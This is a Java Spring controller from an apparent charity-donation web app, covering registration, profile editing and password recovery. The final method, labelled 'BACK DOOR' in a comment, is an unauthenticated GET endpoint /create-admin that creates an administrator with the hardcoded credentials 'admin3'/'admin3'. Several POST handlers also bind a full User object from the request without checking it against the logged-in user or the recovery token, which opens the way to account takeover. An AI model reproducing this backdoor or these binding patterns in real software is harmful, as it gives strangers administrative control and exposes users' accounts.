package pl.coderslab.charity.controller;

import lombok.RequiredArgsConstructor;
import org.springframework.security.core.annotation.AuthenticationPrincipal;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.*;
import pl.coderslab.charity.entity.Token;
import pl.coderslab.charity.entity.User;
import pl.coderslab.charity.service.*;

import javax.validation.Valid;
import java.util.Optional;

@RequiredArgsConstructor
@Controller
public class UserController {

    private final UserService userService;
    private final TokenService tokenService;
    private final UserRegister userRegister;
    private final UserPasswordRecoveryService userPassRecoveryService;

    @GetMapping("/register")
    private String showRegisterForm(Model model){
        model.addAttribute("user", new User());
        return "/register/register";
    }

    @PostMapping("/register")
    private String proceedRegisterForm(@Valid User user, BindingResult result, @RequestParam String password2){
        if(result.hasErrors() || !userService.verifyPasswordRepetition(user.getPassword(), password2) || userService.dataRepetitionFound(user)){
            return "/register/register";
        }
        userRegister.saveNotRegisteredUser(user);
        return "/register/register-mail-sent";
    }

    @GetMapping("/register/uuid/{token}")
    private String showRegisterConfirmation(@PathVariable String token){
        Token tokenDB = tokenService.findByToken(token);
        if(tokenDB!=null && tokenDB.getToken().equals(token)){
            userRegister.register(tokenDB.getUser());
            return "/register/register-success";
        }
        return "/error";
    }


    @GetMapping("/user/edit")
    private String showUserEditForm(@AuthenticationPrincipal CurrentUser currentUser, Model model){
        model.addAttribute("user", userService.findByUserName(currentUser.getUsername()));
        return "user/edit";
    }

    @PostMapping("/user/edit")
    private String proceedUserEditForm(@Valid User user, BindingResult result){

        if (userService.emailRepetitionFound(user) || result.hasErrors()){
            return "user/edit";
        }
        userService.save(user);
        return "redirect:/";
    }

    @GetMapping("/user/password/edit")
    private String showUserPasswordEditForm(@AuthenticationPrincipal CurrentUser currentUser, Model model){
        User user = userService.findByUserName(currentUser.getUsername());
        user.setPassword("");
        model.addAttribute("user", user);
        return "user/password-edit";
    }

    @PostMapping("/user/password/edit")
    private String proceedUserPasswordEditForm(@Valid User user, BindingResult result, @RequestParam String password2){
        if (!result.hasErrors() && userService.verifyPasswordRepetition(user.getPassword(), password2)){
            userService.changePassword(user);
            return "redirect:/";
        }
        return "user/password-edit";
    }

    @GetMapping("/password-recovery")
    public String showPasswordRecoveryForm(){
        return "/password-recovery/get-mail";
    }

    @PostMapping("/password-recovery")
    public String processPasswordRecoveryForm(@RequestParam String email){
        Optional<User> userOptional = userService.findByEmail(email);
        if (userOptional.isPresent()){
            userPassRecoveryService.passwordRecover(userOptional.get());
            return "/password-recovery/mail-sent";
        }
        return "user/unknown-mail";
    }

    @GetMapping("/password-recovery/uuid/{code}")
    public String showPasswordForm(Model model, @PathVariable String code){
        Token token = tokenService.findByToken(code);
        if(token!=null && token.getToken().equals(code)){
            model.addAttribute("user", token.getUser());
            return "/password-recovery/set";
        }
        return "/error";
    }

    @PostMapping("/password-recovery/uuid/{code}")
    public String processPasswordForm(@Valid User user, BindingResult result, @RequestParam String password2){
        if (!userService.verifyPasswordRepetition(user.getPassword(), password2) || result.hasErrors()){
            return "/password-recovery/set";
        }
        userPassRecoveryService.editPassword(user);
        return "/password-recovery/confirmed";
    }

   // BACK DOOR BACK DOOR BACK DOOR

    @GetMapping("/create-admin")
    @ResponseBody
    public String createUser() {
        User user = new User();
        user.setUsername("admin3");
        user.setPassword("admin3");
        user.setEmail("emzio@outlook.com");
        user.setLastname("admin3");
        user.setName("admin3");

        userService.saveAdmin(user);
        return "admin";
    }

}
